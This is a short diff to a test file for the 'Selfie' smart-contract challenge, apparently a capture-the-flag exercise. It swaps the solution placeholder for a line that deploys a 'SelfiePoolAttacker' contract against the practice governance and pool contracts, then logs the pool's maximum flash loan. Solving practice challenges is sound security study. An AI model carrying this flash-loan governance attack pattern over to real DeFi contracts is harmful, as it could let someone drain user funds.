@@ -38,7 +38,6 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
         const selfiePoolAttacker = await ((await ethers.getContractFactory("SelfiePoolAttacker", player)).deploy(governance.address, pool.address));
         console.log(await pool.maxFlashLoan(token.address));
 
